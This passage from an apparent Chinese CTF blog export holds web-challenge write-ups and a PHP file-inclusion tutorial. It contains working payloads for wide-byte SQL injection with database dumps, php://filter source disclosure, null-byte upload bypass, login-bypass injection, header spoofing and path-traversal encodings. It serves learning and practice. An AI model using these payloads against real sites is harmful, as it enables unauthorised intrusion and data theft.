&lt;li&gt;&lt;a href=&quot;index.php?type=1&quot;&gt;热门分类&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;index.php?type=2&quot;&gt;学习分类&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;index.php?type=3&quot;&gt;游戏分类&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;index.php?type=4&quot;&gt;睡觉分类&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;index.php?type=5&quot;&gt;嘿嘿分类&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;ul&gt; &lt;?php if(empty($resultNEWS)) echo (&#x27;没有此类新闻&#x27;); else&#123; foreach ($resultNEWS as $key =&gt; $value) &#123; ?&gt; &lt;li&gt; &lt;h3&gt;&lt;?php echo $value[&#x27;title&#x27;];?&gt;&lt;/h3&gt; &lt;article&gt;&lt;?php echo $value[&#x27;content&#x27;];?&gt;&lt;/article&gt; &lt;/li&gt; &lt;?php &#125;&#125; ?&gt; &lt;/ul&gt; &lt;!-- 源码备份 source.zip --&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"cumt","slug":"cumt","permalink":"http://example.com/tags/cumt/"}]},{"title":"南邮ctf--web","slug":"大学CTF/南邮ctf-web","date":"2019-03-30T11:01:51.000Z","updated":"2019-05-09T08:21:07.409Z","comments":true,"path":"2019/03/30/大学CTF/南邮ctf-web/","link":"","permalink":"http://example.com/2019/03/30/%E5%A4%A7%E5%AD%A6CTF/%E5%8D%97%E9%82%AEctf-web/","excerpt":"前言菜，就要多做题","text":"前言菜，就要多做题 正文签到题直接看源码就可以了。 md5 collision这题是md5的碰撞问题 $md51 == $md52 md5弱比较，为0e开头的会被识别为科学记数法，结果均为0 payload:?a=aabg7XSs或者?a=240610708) 还有这些都是一些常用的。 QNKCDZO，240610708，s878926199a，s155964671a，s214587387a，s214587387a 签到2 要求输入zhimakaimen，但是输入之后也没用。 bp抓包，发现zhimakaimen变成了zhimakaime，少了个n，应该是限制了长度 直接加上n，然后go，即可得到flag 这题不是web 刚开始有点迷，就一张图，既然他说不是web，就把图下载下来，放到hxd里看一看，搜索nctf，在最后找到flag 层层递进打开之后就是一个普通的网页，题目中说到微博，我还去看了看，啥也没发现，不过也关注了黑客叔叔QAQ。 题目叫层层递进，在网页中找了半天，点了很多网页也没发现什么，只能查看源码， 发现有一个SO.html 访问一下，又出现一个界面，明显不是同一个界面，再看源码，又有一个S0.html，访问，又出现一个界面，源码里是SO.htm，访问，又有一个界面，是S0.html，继续，这次源码里有一个404.html，访问，出现如下： 继续查看源码，发现好大一段注释啊，仔细看看，里面就有flag 这题还真的是层层递进啊。 还有一种方法，直接扫描了一下网站后台，就可以发现404了，，，，，， AAencode打开题目，不知道是什么鬼， Google打开 看来是编码问题，Unicode之后，就会得到一段AAencode加密的话 1ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [&#x27;_&#x27;]; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &#x27;_&#x27; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#x27;_&#x27;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&#x27;_&#x27;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [c^_^o];(ﾟДﾟ) [&#x27;c&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#x27;o&#x27;] = ((ﾟДﾟ)+&#x27;_&#x27;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&#x27;c&#x27;]+(ﾟДﾟ) [&#x27;o&#x27;]+(ﾟωﾟﾉ +&#x27;_&#x27;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&#x27;_&#x27;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#x27;c&#x27;]+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#x27;o&#x27;]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ];(ﾟДﾟ) [&#x27;_&#x27;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#x27;_&#x27;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&#x27;_&#x27;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#x27;_&#x27;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#x27;\\\\&#x27;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&#x27;_&#x27;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&#x27;\\&quot;&#x27;;(ﾟДﾟ) [&#x27;_&#x27;] ( (ﾟДﾟ) [&#x27;_&#x27;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#x27;_&#x27;); 直接放在控制台里跑一下，就行 单身20年说道手速问题，直接bp抓包 PHP decode给了一段PHP代码 12345678910&lt;?phpfunction CLsI($ZzvSWE) &#123; $ZzvSWE = gzinflate(base64_decode($ZzvSWE)); for ($i = 0; $i &lt; strlen($ZzvSWE); $i++) &#123; $ZzvSWE[$i] = chr(ord($ZzvSWE[$i]) - 1); &#125; return $ZzvSWE; &#125;eval(CLsI(&quot;+7DnQGFmYVZ+eoGmlg0fd3puUoZ1fkppek1GdVZhQnJSSZq5aUImGNQBAA==&quot;));?&gt; eval()这个函数运行时，会执行他括号里面的语句，这里面应该是flag， 所以把eval改成echo，放在本地运行一下，就可以输出flag 或者找个在线执行代码的网站，执行一下。 文件包含既然叫文件包含了，那就文件包含了。 直接拿payload index.php?file=php://filter/read=convert.base64-encode/resource=index.php 以base64编码把index.php源码读出来，然后base64解码，即可得到flag。 单身一百年也没用还是抓包，go了一次之后啥也没有，那就再go一次，得到flag Download题目似乎坏掉了 cookie打开题目一个空白页，bp抓包试试， 发现cookie：login=0 改成login=1试试，就得到flag了 MySQL提示了robots.txt，那就打开robots.txt看看 tip：sql.php,应该是这个页面的问题，源码中当id=1024时，会输出“no，try again”，id!=1024时，才弹出content(应该有flag)，但是当id=1，2，，，等数字时，也没用弹出， 代码中有个intval函数，这个函数是取整函数， 如果我们输入1024.xxxxxx，如1024.000001的话，intval会取整，那么$id会是1024，但是当判断$_GET[id]==1024时就会为假，因为没有强制类型转化，所以两个一个是1024，一个是1024*10^12，不相等，两个条件同时满足，因此就能绕过得到flag GBK Injection id=1时正常，加上单引号之后，发现单引号被转义了， 再看看题目，肯定是宽字节注入了，页面编码保存为gbk， 宽字节注入，就是为了逃过转义函数的限制，宽字节注入就是利用了mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字，我们可以输入%df试一下。 payload：?id=1%df&#39; 可以看到，有了报错信息，这样就可以注入了 测试后发现只有两列 爆库 ?id=-1%df&#39; union select 1,database()%23 爆表 `?id=-1%df’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23 爆列 ?id=-1%df&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x637466%23 把”ctf“转换成十六进制，挨个都爆了一遍，最终在ctf4中发现flag 爆数据 ?id=-1%df%27 union select 1,flag from ctf4%23 得到一个flag，提交之后不对， 只能再挨个文件找，在ctf的pw中找到一个，也不对，看来是被别人玩坏了 不过，注入的目的已经实现了。 /x0012345678if (isset ($_GET[&#x27;nctf&#x27;])) &#123; if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#x27;nctf&#x27;]) === FALSE) echo &#x27;必须输入数字才行&#x27;; else if (strpos ($_GET[&#x27;nctf&#x27;], &#x27;#biubiubiu&#x27;) !== FALSE) die(&#x27;Flag: &#x27;.$flag); else echo &#x27;骚年，继续努力吧啊~&#x27;; &#125; 给了源码，那就好说了 ereg函数会把null值当成结束，可以使用%00截断，但是strpps会绕过%00， strpos ($_GET[‘nctf’], ‘#biubiubiu’) !== FALSE，这句话要求nctf中包含“#biubiubiu”，所以构造payload： ?nctf=1%00%23biubiubiu 还有一种简单的方法，那就是strpos会被数组绕过 payload：?nctf[]= 就可以了。 bypass again1234567if (isset($_GET[&#x27;a&#x27;]) and isset($_GET[&#x27;b&#x27;])) &#123;if ($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;])if (md5($_GET[&#x27;a&#x27;]) == md5($_GET[&#x27;b&#x27;]))die(&#x27;Flag: &#x27;.$flag);elseprint &#x27;Wrong.&#x27;;&#125; 给了源码，MD5弱比较，直接数组绕过 payload:?a[]=1&amp;b[]=2 或者取两个MD5值也可以 payload：?a=QNKCDZO&amp;b=240610708 变量覆盖根据页面的提示，在source.php中找到源码 123456&lt;?php if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123; ?&gt; &lt;?php extract($_POST); if ($pass == $thepassword_123) &#123; ?&gt; &lt;div class=&quot;alert alert-success&quot;&gt; &lt;code&gt;&lt;?php echo $theflag; ?&gt; 看到了，extract函数，所以只要post传入任意的pass与thepassword_123值相等即可 PHP是世界上最好的语言挂了 伪装者 看样子是要伪装成本地登录了，bp抓包，直接在header里添加 X-Forwarded-For:127.0.0.1 header挂了 上传绕过看一下源码 12345678910111213141516&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot; /&gt;&lt;/head&gt; &lt;body&gt;&lt;br&gt;&lt;br&gt;文件上传&lt;br&gt;&lt;br&gt;&lt;form action=&quot;upload.php&quot; method=&quot;post&quot;enctype=&quot;multipart/form-data&quot;&gt;&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;&lt;input type=&quot;hidden&quot; name=&quot;dir&quot; value=&quot;/uploads/&quot; /&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;br /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 传一张图片，显示如下： 提示上传.php，传一个php文件后，又说不能传php bp抓包，先上传图片，抓到薄厚，再修改后缀名，尝试了很多php，Php，pHp，phP，PHp，pHP，PhP，PHP，phpphp，phphpp，php3，php4，php5等发现都失败， 再看看源码和报错信息，发现在经过图片后缀检查后，根据basename判断是不是php文件，所以可以用空字节截断，上传一个图片，在/uploads/后给出一个名字比如:/uploads/1.php然后在php后用hex增加一个00字符，即可成功绕过。 SQL注入1点击source看一下源码，看一下SQL语句 1$sql=&quot;select user from ctf where (user=&#x27;&quot;.$user.&quot;&#x27;) and (pw=&#x27;&quot;.$pass.&quot;&#x27;)&quot;; 发现是单引号+括号的闭合，post：user=1&#39;)%23&amp;pass=1,不报错，闭合成功 要求是admin用户，那就构造payload： user=admin&#39;)%23&amp;pass=1 //%23会把后面的注释掉，不管密码对不对都可以 pass check源码 12345678910111213$pass=@$_POST[&#x27;pass&#x27;];$pass1=***********;//被隐藏起来的密码if(isset($pass))&#123;if(@!strcmp($pass,$pass1))&#123;echo &quot;flag:nctf&#123;*&#125;&quot;;&#125;else&#123;echo &quot;the pass is wrong!&quot;;&#125;&#125;else&#123;echo &quot;please input pass!&quot;;&#125;?&gt; 考察PHP弱类型，从PHP社区文档的注解可以发现strcmp函数在比较数组时,会返回null。所以post的数据为pass[]=a 起名字真难源码 123456789101112131415161718192021&lt;?phpfunction noother_says_correct($number)&#123; $one = ord(&#x27;1&#x27;); $nine = ord(&#x27;9&#x27;); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == &#x27;54975581388&#x27;;&#125;$flag=&#x27;*******&#x27;;if(noother_says_correct($_GET[&#x27;key&#x27;])) echo $flag;else echo &#x27;access denied&#x27;;?&gt; 不能传入数字，但是要传入54975581388，才能得到flag，转换为十六进制传入可以绕过 密码重置 要admin用户密码，但是此时的用户是ctfuser，而且在不能在输入框中直接改，发现url中有user1=Y3RmdXNlcg==，Y3RmdXNlcg==是ctfuser经过base64加密的，所以把admin用base64编码之后，传入url中，发现没用，bp抓包试试 发现有三处穿了user的信息，把这三处都改成admin，其中前两处需要base64编码，即可得到flag SQL Injection1234567891011121314151617181920212223&lt;!--#GOAL: login as admin,then get the flag;error_reporting(0);require &#x27;db.inc.php&#x27;;function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES);&#125;$username = @clean((string)$_GET[&#x27;username&#x27;]);$password = @clean((string)$_GET[&#x27;password&#x27;]);$query=&#x27;SELECT * FROM users WHERE name=\\&#x27;&#x27;.$username.&#x27;\\&#x27; AND pass=\\&#x27;&#x27;.$password.&#x27;\\&#x27;;&#x27;;$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die(&#x27;Invalid password!&#x27;);&#125;echo $flag;--&gt; TIP:反斜杠可以用来转义，仔细查看相关函数的用法 通过代码发现，需要传入GET类型的username以及password，首先调用了clean方法，在clean方法首先判断是否开启了添加反斜杠，如果添加了，使用stripslashes()删除反斜杠，然后调用htmlentities()方法将把字符转换为 HTML 实体,htmlentities($str, ENT_QUOTES)用来转换双引号和单引号。 函数原型是这样 string htmlentities ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get(“default_charset”) [, bool $double_encode = true ]]] ) 参数flags缺省情况下与$flags=ENT_QUOTES情况下函数行为不同， 选值为ENT_QUOTES时Will convert both double and single quotes， 也就是说，前者不会将单引号编码而后者会。我们的最终目标是平衡引号，从而使查询语句语法正确，既然无法输入单引号，就消灭单引号。 访问http://chinalover.sinaapp.com/web15/index.php?username=\\&amp;password= or 1%23， 也就是构造payload为?username=\\&amp;password= or 1%23 ，使得查询语句如下： SELECT FROM users WHERE name=’admin\\’ AND pass=’ or 1 #’; 综合题一大段的JSFUCK 解码看看，得到一个文件名，1bc29b36f623ba82aaf6724fd3b16718.php，访问一下， 密码重置2这题在学校的平台上做过。而且提示也够多。 看看源码，两处有用信息，首先这里，给了用户名，邮箱，文件编辑器 这里显示了有一个submit.php的页面 访问submit.php之后，说you are not admin, 要求管理员登录，邮箱知道了，但是token不知道，利用文件泄露，查看**.index.php.swp，啥也没有，查看.submit.php.swp**，会看到返回了源码 123456789101112if(!empty($token)&amp;&amp;!empty($emailAddress))&#123; if(strlen($token)!=10) die(&#x27;fail&#x27;); if($token!=&#x27;0&#x27;) die(&#x27;fail&#x27;); $sql = &quot;SELECT count(*) as num from `user` where token=&#x27;$token&#x27; AND email=&#x27;$emailAddress&#x27;&quot;; $r = mysql_query($sql) or die(&#x27;db error&#x27;); $r = mysql_fetch_assoc($r); $r = $r[&#x27;num&#x27;]; if($r&gt;0)&#123; echo $flag; &#125;else&#123; echo &quot;失败了呀&quot;; &#125; 看了源码，token有两个条件 token长度等于10，值要等于0 那么只需要使token=0000000000或者token=0e11111111(0e开头，PHP会解析为0)， email就是上面的&#97;&#x64;&#x6d;&#105;&#x6e;&#x40;&#x6e;&#117;&#112;&#x74;&#x7a;&#x6a;&#x2e;&#99;&#x6e; PHP反序列化123456789101112131415161718192021222324&lt;?phpclass just4fun &#123; var $enter; var $secret;&#125;if (isset($_GET[&#x27;pass&#x27;])) &#123; $pass = $_GET[&#x27;pass&#x27;]; if(get_magic_quotes_gpc())&#123; $pass=stripslashes($pass); &#125; $o = unserialize($pass); if ($o) &#123; $o-&gt;secret = &quot;*&quot;; if ($o-&gt;secret === $o-&gt;enter) echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret; else echo &quot;Oh no... You can&#x27;t fool me&quot;; &#125; else echo &quot;are you trolling?&quot;;?&gt; $o = unserialize($pass) 然后将pass进行反序列化操作，并赋值给变量$o 如果对象o赋值成功，将对象o的secret变量设置为*，并判断对象o的secret变量和enter变量是否相等，===判断数值及属性，如果相等输出flag。 所以我们想到了引用a=&amp;b，&amp;属于引用，属于浅拷贝，一个改变另外一个也随之改变。$this-&gt;enter=&amp;$this-&gt;secret 直接写一段代码: 123456789&lt;?phpclass just4fun&#123; var $enter; var $secert; function __construct()&#123; $this-&gt;enter=&amp;$this-&gt;secert;&#125;&#125;$a=new just4fun();print_r(serialize($a)); 运行之后得到O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secert&quot;;R:2;&#125;,构造payload： ?pass=O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secert&quot;;R:2;&#125; file_get_contents查看源码 1234&lt;!--$file = $_GET[&#x27;file&#x27;];if(@file_get_contents($file) == &quot;meizijiu&quot;)&#123; echo $nctf;&#125;--&gt; file_get_contents() 函数把整个文件读入一个字符串中。 如果从$file读入的字符串是”meizijiu”，就输出flag，可以利用PHP伪协议，php://input从我们post的信息中读入数据流，","categories":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/categories/ctf/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"南邮web","slug":"南邮web","permalink":"http://example.com/tags/%E5%8D%97%E9%82%AEweb/"}]},{"title":"php文件包含","slug":"大学CTF/php文件包含","date":"2019-03-28T13:15:40.000Z","updated":"2021-05-23T11:03:55.128Z","comments":true,"path":"2019/03/28/大学CTF/php文件包含/","link":"","permalink":"http://example.com/2019/03/28/%E5%A4%A7%E5%AD%A6CTF/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","excerpt":"前言最近发现有很多文件包含的题目，而自己也只是一知半解，借着大佬的blog学习一下。看着chebeta做的，只做了一部分，具体的看原文chebeta。","text":"前言最近发现有很多文件包含的题目，而自己也只是一知半解，借着大佬的blog学习一下。看着chebeta做的，只做了一部分，具体的看原文chebeta。 正文相关函数PHP中能引发文件包含漏洞的函数通常是以下四个： 1.include() 2.include_once() 3.require() 4.require_once include 和 require 语句用于在执行流中插入写在其他文件中的有用的代码。 include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的： require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。 include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。 include_once： 使用include_once会在导入文件前先检测该文件是否在该页面的其他部分被应用过，如果有，则不会重复引用该文件，程序只能引用一次。（要导入的文件中存在一些自定义函数，那么如果在同一个程序中重复导入这个文件，在第二次导入时便会发生错误，因为php不允许相同名称的函数被重复声明） require_once： require_once语句是require语句的延伸，他的功能与require语句基本一致，不同的是，在应用require_once时，先会检查要引用的文件是不是已将在该程序中的其他地方被引用过，如果有，则不会在重复调用该文件。（同事使用require_once语句在同一页面中引用了两个不同的文件，那么在输出时，只有第一个文件被执行，第二个引用的文件则不会被执行） 区别：如果一个文件已经被包含过了，则 require_once() 和 include_once() 则不会再包含它，以避免函数重定义或变量重赋值等问题。 当利用这四个函数来包含文件时，不管文件是什么类型（图片、txt等等），都会直接作为php文件进行解析。测试代码： 1234&lt;?php $file=$_GET[&#x27;file&#x27;]; include $file;?&gt; 在同目录下有个phpinfo.txt，其内容为&lt;?php phpinfo(); ?&gt;。则只需要访问： http://127.0.0.1/phpinclude/index.php?file=phpinfo.txt 就可以成功解析成php 场景 具有相关的文件包含函数。 文件包含函数中存在动态变量，比如 include $file;。 攻击者能够控制该变量，比如$file = $_GET[&#39;file&#39;];。 分类LFI(Local File Inclusion)本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。 RFI(Remote File Inclusion)远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。但RFI的利用条件较为苛刻，需要php.ini中进行配置: allow_url_fopen = On //on 默认开启 该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。 allow_url_include = On //off 默认关闭，该选项为on便是允许 包含URL 对象文件等 两个配置选项均需要为On，才能远程包含文件成功。 在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。 这个文件必须命名为’php.ini’,并放置在httpd.conf中的PHPIniDir指令指定的目录中，使用phpinfo()函数可以查看。如果未作修改，windows平台下一般放在php安装目录中。 包含姿势下面例子中index.php测试代码均为： 1234&lt;?php $file = $_GET[&#x27;file&#x27;]; include $file;?&gt; allow_url_fopen 默认为 Onallow_url_include 默认为 Off 若有特殊要求，会在利用条件里指出。 php伪协议为了能够尽可能的列举所有情况本次测试使用的PHP版本为&gt;=5.2 具体为5.2，5.3，5.5，7.0；PHP版本&lt;=5.2 可以使用%00进行截断。 php://input allow_url_include = On。 对allow_url_fopen不做要求。 php://input 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。 php://filterphp://filter在双off的情况下也可以正常使用； allow_url_fopen ：off/onallow_url_include：off/on php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了 解密后： payload: index.php?file=php://filter/read=convert.base64-encode/resource=index.php index.php?file=php://filter/convert.base64-encode/resource=index.php //不加read也可以，在绕过一些waf时也许有用。 phar://利用条件： php版本大于等于php5.3.0 姿势： 假设有个文件phpinfo.txt，其内容为&lt;?php phpinfo(); ?&gt;，打包成zip压缩包，如下： 指定绝对路径 index.php?file=phar://F:/phpstudy/PHPTutorial/WWW/phpinclude/phpinfo.zip/phpinfo.txt 或者使用相对路径（这里test.zip就在当前目录下） index.php?file=phar://phpinfo.zip/phpinfo.txt zip://利用条件： php版本大于等于php5.3.0 姿势：构造zip包的方法同phar。 但使用zip协议，需要指定绝对路径，不能使用相对路径，同时将#编码为%23，之后填上压缩包内的文件。 index.php?file=zip://F:/phpstudy/PHPTutorial/WWW/phpinclude/phpinfo.zip%23phpinfo.txt 包含session利用条件：session文件路径已知，且其中内容部分可控。 姿势： php的session文件的保存路径可以在phpinfo的session.save_path看到。 常见的php-session存放位置： /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session的文件名格式为sess_[phpsessid]。而phpsessid在发送的请求的cookie字段中可以看到。 要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。 比如这篇文章： 透過 LFI 引入 PHP session 檔案觸發 RCE 绕过姿势平常碰到的情况肯定不会是简简单单的include $_GET[&#39;file&#39;];这样直接把变量传入包含函数的。在很多时候包含的变量/文件不是完全可控的，比如下面这段代码指定了前缀和后缀： 1234&lt;?php $file = $_GET[&#x27;file&#x27;]; include &#x27;/var/www/html/&#x27;.$file.&#x27;/test/test.php&#x27;;?&gt; 这样就很“难”直接去包含前面提到的种种文件。 指定前缀1234&lt;?php $file = $_GET[&#x27;file&#x27;]; include &#x27;/var/www/html/&#x27;.$file;?&gt; 目录遍历这个最简单了，简要的提一下。 现在在/var/log/test.txt文件中有php代码&lt;?php phpinfo();?&gt;，则利用../可以进行目录遍历，比如我们尝试访问： include.php?file=../../log/test.txt 则服务器端实际拼接出来的路径为：/var/www/html/../../log/test.txt，也即/var/log/test.txt。从而包含成功。 编码绕过服务器端常常会对于../等做一些过滤，可以用一些编码来进行绕过。下面这些总结来自《白帽子讲Web安全》。 利用url编码 ../ %2e%2e%2f ..%2f %2e%2e/ ..\\ %2e%2e%5c ..%5c %2e%2e\\ 二次编码 ../ 